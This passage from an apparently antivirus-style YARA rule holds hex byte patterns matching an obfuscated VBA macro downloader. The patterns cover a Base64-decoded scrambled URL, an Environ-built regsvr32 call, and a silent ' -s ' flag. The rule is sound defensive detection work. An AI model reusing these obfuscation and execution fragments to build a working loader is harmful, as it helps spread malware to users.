        $x_1_2 = {44 65 63 6f 64 65 42 61 73 65 36 34 28 28 [0-15] 28 [0-15] 28 22 [0-5] 3b 36 68 2d 74 32 30 74 20 [0-2] 70 36 73 20 3a [0-2] 22 29 20 26 20 22 3a 2f 2f 22 20 26 20 [0-15] 28 22 [0-15] 22 29 20 26 20 22 2e 22 20 26 20 [0-15] 28 22 2f [0-2] 63 31 32 6f 2d [0-2] 6d [0-2] 22 29 29 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {28 4c 65 66 74 28 45 6e 76 69 72 6f 6e 28 [0-15] 28 22 [0-3] 38 63 2d 6f 30 6d [0-2] 3b 73 37 70 [0-2] 30 31 65 63 [0-2] 22 29 29 2c 20 32 30 29 20 26 20 [0-15] 28 22 [0-2] 31 72 [0-2] 2d 65 38 [0-2] 30 67 2c 73 37 3b [0-2] 30 76 [0-2] 38 72 [0-2] 22 29 20 26 20 22 33 32 2e 22 20 26 20 [0-15] 28 22 31 65 [0-2] 37 2d 78 3b 65 [0-3] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {30 5c 39 63 36 61 6c 39 63 [0-2] 22 29 20 26 20 22 2e 22 20 26 20 [0-15] 28 22 [0-2] 39 65 37 2d 78 35 65 [0-2] 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {44 65 62 75 67 2e 50 72 69 6e 74 20 [0-15] 28 [0-15] 2c 20 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_6 = "& \" -s \" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

